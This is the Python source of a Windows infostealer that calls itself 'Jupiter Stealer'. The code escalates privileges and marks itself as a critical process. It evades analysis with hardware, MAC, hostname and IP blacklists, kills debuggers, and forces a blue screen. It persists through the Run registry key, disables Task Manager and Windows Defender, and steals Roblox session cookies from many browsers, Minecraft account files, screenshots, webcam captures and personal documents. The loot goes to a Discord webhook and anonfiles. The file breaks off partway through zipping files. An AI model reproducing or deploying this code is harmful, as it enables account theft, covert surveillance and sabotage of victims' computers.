import uuid
import socket
import getmac
import wmi
import robloxpy
import psutil
import requests
import browser_cookie3
import ctypes
import os
import sys
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import ctypes.wintypes
import winreg
from tkinter import messagebox
import time
from zipfile import ZipFile
import io
import json
import netifaces
import subprocess
from pynput import keyboard
from PIL import ImageGrab
import getpass
import zipfile
import threading
import tempfile
import cv2

ntdll = ctypes.WinDLL("ntdll.dll")

def RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege):
    PreviousValue = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege, ctypes.byref(PreviousValue))
    return PreviousValue.value

def NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption):
    Response = ctypes.c_uint()
    ntdll.NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption, ctypes.byref(Response))
    return Response.value

webhook = "webhook_here"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    while not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

        if result <= 32:
            print("Failed to elevate privileges, please try again.")
            continue
        else:
            while not is_admin():
                continue
try:
    elevate_privileges()
except:
    sys.exit()

PROCESS_TERMINATE = 0x0001
PROCESS_SET_INFORMATION = 0x0200
PROCESS_DUP_HANDLE = 0x0040
HANDLE_FLAG_INHERIT = 0x00000001
STATUS_SUCCESS = 0x00000000

handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE | PROCESS_SET_INFORMATION | PROCESS_DUP_HANDLE, False, ctypes.windll.kernel32.GetCurrentProcessId())

ret = ctypes.windll.ntdll.NtSetInformationProcess(handle, 0x1d, ctypes.byref(ctypes.c_ulong(1)), ctypes.sizeof(ctypes.c_ulong))

if ret == STATUS_SUCCESS:
    print("Process protection enabled.")
else:
    print("Failed to enable process protection.")
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)
    sys.exit(1)

blacklisted_hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6'] 

def get_hwid():
    command = 'wmic csproduct get uuid'
    output = subprocess.check_output(command, shell=True).decode('utf-8')
    hwid = output.strip().split('\n')[-1]
    return hwid

def check_hwid(hwid):
    if hwid in blacklisted_hwids:
        return True
    else:
        return False

user_hwid = get_hwid()
if check_hwid(user_hwid):
    print('Sorry, your HWID is blacklisted.')
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)
else:
    print('Welcome! Your HWID is not blacklisted.')

blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)

def UsernamePC():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        sys.exit()

try:
   UsernamePC()
except:
    sys.exit()

MACBLACKLIST = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in MACBLACKLIST:
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)

ip_response = requests.get('https://api.ipify.org?format=json')
public_ip = ip_response.json()['ip']

url = 'https://raw.githubusercontent.com/ThunderboltDev/IP-BLACKLIST/main/blacklist_ips.js'
response = requests.get(url)
blacklist_js = response.text

blacklist_ips = []
start_index = blacklist_js.find('[') + 1
end_index = blacklist_js.find(']')
ip_list = blacklist_js[start_index:end_index].replace('"', '').split(',')

for ip in ip_list:
    blacklist_ips.append(ip.strip())

if public_ip in blacklist_ips:
    print(f'The public IP {public_ip} is blacklisted.')
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)
else:
    print(f'The public IP {public_ip} is not blacklisted.')

blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

def check_process() -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)
try:
    check_process()
except:
    pass

def startupexe():
    exe_path = sys.executable

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)

    exe_name = os.path.basename(exe_path)
    exe_path = os.path.abspath(exe_path)
    winreg.SetValueEx(key, exe_name, 0, winreg.REG_SZ, exe_path)

    winreg.CloseKey(key)

def fakeError():
    messagebox.showerror("messagebox_title", f"messagebox_message")
    time.sleep(3)

key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
value_name = "DisableTaskMgr"

try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
except FileNotFoundError:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)

try:
    winreg.QueryValueEx(key, value_name)
except FileNotFoundError:
    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)

winreg.CloseKey(key)

current_exe = sys.executable

key_path = r"Software\Microsoft\Windows Defender\Exclusions\Paths"
key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)

winreg.SetValueEx(key, "svchost", 0, winreg.REG_SZ, current_exe)

winreg.CloseKey(key)


def disable_defender_protections():
    try:
        key_path_rt = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        key_rt = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path_rt, 0, winreg.KEY_WRITE)

        value_name_rt = "DisableRealtimeMonitoring"
        value_rt = 1
        winreg.SetValueEx(key_rt, value_name_rt, 0, winreg.REG_DWORD, value_rt)

        winreg.CloseKey(key_rt)

        key_path_tp = r"SOFTWARE\Microsoft\Windows Defender\Features"
        key_tp = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path_tp, 0, winreg.KEY_WRITE)

        value_name_tp = "TamperProtection"
        value_tp = 0
        winreg.SetValueEx(key_tp, value_name_tp, 0, winreg.REG_DWORD, value_tp)

        winreg.CloseKey(key_tp)

        print("Windows Defender real-time protection and Tamper Protection have been disabled successfully.")
    except Exception as e:
        print("An error occurred while disabling Windows Defender protections:", str(e))

try: 
   disable_defender_protections()
except:
    pass



def cookiecheckerandsend(cookie, platform):

    hwid = str(uuid.uuid1())

    mac_address = getmac.get_mac_address()

    hostname = socket.gethostname()

    mem = psutil.virtual_memory()

    wmi_service = wmi.WMI()

    processor_info = wmi_service.Win32_Processor()[0]

    graphics_cards = wmi_service.Win32_VideoController()

    wmi_obj = wmi.WMI()

    c = wmi.WMI()

    os_info = wmi_obj.Win32_OperatingSystem()[0]

    gpu_info = f"\"Name\": \"{graphics_cards[0].Name}\", \"AdapterRAM\": \"{str(graphics_cards[0].AdapterRAM)}\", \"VideoProcessor\": \"{graphics_cards[0].VideoProcessor}\""

    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
    rid = info["UserID"]
    username = info['UserName']
    robux = info['RobuxBalance']
    premium = info['IsPremium']
    rap = robloxpy.User.External.GetRAP(rid)
    friends = robloxpy.User.Friends.External.GetCount(rid)
    age = robloxpy.User.External.GetAge(rid)
    crdate = robloxpy.User.External.CreationDate(rid)

    requests.post(url=webhook, json={
        'username': "Cookie Grabber",
        'avatar_url': "https://avatars.githubusercontent.com/u/130176211?v=4",
        'embeds': [{
                "title": f"💰 Valid Account - {platform}",
                "description" : f"[Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
                "image": {
                    "url" : "https://files.catbox.moe/z1gfyf.gif"
                    },
                "color" : 31007,
                "fields": [
                    {"name": "Username", "value": username, "inline": True},
                    {"name": "Robux", "value": robux, "inline": True},
                    {"name": "Premium", "value": premium,"inline": True},
                    {"name": "Date of Creation", "value": crdate, "inline": True},
                    {"name": "RAP", "value": rap,"inline": True},
                    {"name": "Friends", "value": friends, "inline": True},
                    {"name": "Age", "value": f"{age} Days ; {int(age)/365:.2f} Years", "inline": True},
                    {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
                    {"name": "HWID", "value": f"`{hwid}`", "inline": True},
                    {"name": "MAC Address", "value": f"```fix\n{mac_address}```", "inline": True},
                    {"name": "Hostname", "value": f"`{hostname}`", "inline": True},                  
                    {"name": "CPU INFO", "value": f"`{processor_info.Name} \nCores {processor_info.NumberOfCores} \n{processor_info.NumberOfLogicalProcessors} Logical Processors \nSpeed {processor_info.MaxClockSpeed}MHz`", "inline": True},
                    {"name": "GPU INFO", "value": f"`{gpu_info}`", "inline": True},
                    {"name": "Memory Information", "value": f"```fix\n{mem}```", "inline": True},
                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
                    
                ],
                "footer": {
                    "text": "Cookie Stealer"
                }
            }
        ]
    }
)

def cookieLogger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

try:
   fakeError()
   startupexe()
   cookies = cookieLogger()
except:
    messagebox.showerror(f"Error", f"Ooops We Ran into a error trying to make this program work.\n\nPress OK to exit")
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)
    sys.exit()

directory = os.path.expanduser('~') + '\\AppData\\Roaming\\.minecraft\\'

if not os.path.exists(directory):
    print('Minecraft folder not found.')

zip_filename = 'minecraft_json_files.zip'
with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for filename in os.listdir(directory):
        if filename.endswith('.json'):
            zip_file.write(os.path.join(directory, filename), filename)

with open(zip_filename, 'rb') as f:
    payload = {'file': f}
    response = requests.post('https://api.anonfiles.com/upload', files=payload)

if response.ok:
    url = response.json()['data']['file']['url']['short']
    print(f'Successfully uploaded {zip_filename} to {url}.')

    embed = {
        'title': 'Minecraft Account Files Stolen by Jupiter Stealer!',
        'description': f'Click [HERE]({url}) to download the Minecraft JSON files and paste it inside your minecraft folder!.',
        'color': 0x00ff00
    }

    payload = {
        'embeds': [embed]
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook, headers=headers, json=payload)

    if response.ok:
        print('Successfully sent the link to the uploaded file via Discord.')
    else:
        print(f'Failed to send the link to the uploaded file via Discord: {response.text}')
else:
    print(f'Failed to upload {zip_filename} to Anonfiles: {response.text}')

os.remove(zip_filename)


wmi_service = wmi.WMI()

hwid = str(uuid.uuid1())

mac_address = getmac.get_mac_address()

hostname = socket.gethostname()

mem = psutil.virtual_memory()

wmi_service = wmi.WMI()

processor_info = wmi_service.Win32_Processor()[0]

graphics_cards = wmi_service.Win32_VideoController()

wmi_obj = wmi.WMI()

c = wmi.WMI()

mac_address = uuid.getnode()
mac_address_str = ':'.join(format(s, '02x') for s in mac_address.to_bytes(6, byteorder='big')).upper()

os_info = wmi_obj.Win32_OperatingSystem()[0]

gpu_info = f"\"Name\": \"{graphics_cards[0].Name}\", \"AdapterRAM\": \"{str(graphics_cards[0].AdapterRAM)}\", \"VideoProcessor\": \"{graphics_cards[0].VideoProcessor}\""

ip_address = requests.get('https://api.ipify.org').text

screenshot = ImageGrab.grab()

screenshot_bytes = io.BytesIO()
screenshot.save(screenshot_bytes, format='PNG')


temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
temp_file.write(screenshot_bytes.getvalue())
temp_file.close()

files = {
    'file': ('screenshot.png', open(temp_file.name, 'rb'), 'image/png')
}

payload = {
    "embeds": [
        {
            "title": "System Information",
            'description': f'System info',
            "color": 16776960,  # Yellow
            "fields": [
                {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
                {"name": "Hostname", "value": f"`{hostname}`", "inline": True},
                {"name": "CPU INFO", "value": f"`{processor_info.Name} \nCores {processor_info.NumberOfCores} \n{processor_info.NumberOfLogicalProcessors} Logical Processors \nSpeed {processor_info.MaxClockSpeed}MHz`", "inline": True},
                {"name": "GPU INFO", "value": f"`{gpu_info}`", "inline": True},
                {"name": "Memory Information", "value": f"```fix\n{mem}```", "inline": True},
                {"name": "MAC Address", "value": f"```fix\n{mac_address_str}```", "inline": True},
                {"name": "HWID", "value": f"`{hwid}`", "inline": True},
            ],
            "image": {
                "url": "attachment://screenshot.png"
            }
        }
    ]
}

try:
    response = requests.post(webhook, data={'payload_json': json.dumps(payload)}, files=files)
except:
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)
    sys.exit()

try:
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise ValueError("Error opening video capture device")

    ret, frame = cap.read()

    if not ret:
        raise ValueError("Error reading frame from video stream")

    cv2.imwrite("image.png", frame)

    cap.release()

    with open("image.png", "rb") as file:
        response = requests.post("https://api.anonfiles.com/upload", files={"file": file})
        json_data = response.json()

    if not json_data["status"]:
        raise ValueError("Error uploading file to Anonfiles")

    file_url = json_data["data"]["file"]["url"]["full"]

    ip_address = requests.get('https://api.ipify.org/').text
    hostname = socket.gethostname()

    embed = {
        "title": "Camera Grabbed! by Jupiter Stealer",
        "description": f"IP Address: {ip_address}\nHostname: {hostname}\n\n[View Camera Image]({file_url})",
        "image": {
            "url": file_url
        }
    }

    response = requests.post(webhook, json={"embeds": [embed]})

    file_path = "image.png"

    if os.path.exists(file_path):
        os.remove(file_path)
    else:
        print("The file does not exist.")
except:
    pass

username = getpass.getuser()
hostname = socket.gethostname()
fileip = requests.get('https://api.ipify.org').text

dirs_to_search = ['Desktop', 'Downloads', 'Documents', 'Music', 'Pictures', 'Videos', 'OneDrive\\Desktop', 'OneDrive\\Downloads', 'OneDrive\\Documents', 'OneDrive\\Music', 'OneDrive\\Pictures', 'OneDrive\\Videos']

text_extensions = ['.txt']
image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp']
video_extensions = ['.mov', '.mp4', '.avi', '.mkv', '.webm']
office_extensions = ['.docx', '.xlsx', '.pptx', '.accdb', '.pub', '.onetoc', '.one', '.msg']
python_extensions = ['.py', '.pyc', 'pyd', 'pyo', '.pyw']
cpp_extensions = ['.cpp', '.h', '.hpp', '.cxx', '.cc']
csharp_extensions = ['.cs', '.dll', '.sln', '.csproj']
c_extensions = ['.c', '.o', '.a', '.so']

def search_for_files(directory, extensions, max_size):
    file_paths = []
    current_size = 0
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, filename)
                size_mb = os.path.getsize(filepath) / (1024 * 1024)
                if current_size + size_mb <= max_size:
                    file_paths.append(filepath)
                    current_size += size_mb
                else:
                    print(f"Skipping file '{filename}' because adding it would exceed the maximum limit ({max_size:.2f} MB).")
    return file_paths

home_dir = os.path.join("C:\\Users", username)
max_size_mb = 100
all_files = []
for dir_name in dirs_to_search:
    dir_path = os.path.join(home_dir, dir_name)
    if os.path.isdir(dir_path):
        all_files += search_for_files(dir_path, text_extensions, max_size_mb)
        all_files += search_for_files(dir_path, image_extensions, max_size_mb)
        all_files += search_for_files(dir_path, video_extensions, max_size_mb)
        all_files += search_for_files(dir_path, office_extensions, max_size_mb)
        all_files += search_for_files(dir_path, python_extensions, max_size_mb)
        all_files += search_for_files(dir_path, cpp_extensions, max_size_mb)
        all_files += search_for_files(dir_path, csharp_extensions, max_size_mb)
        all_files += search_for_files(dir_path, c_extensions, max_size_mb)

zip_filename = 'files.zip'
with zipfile.ZipFile(zip_filename, 'w') as zip_file:
    for file_path in all_files:
        filename = os.path.basename(file_path)
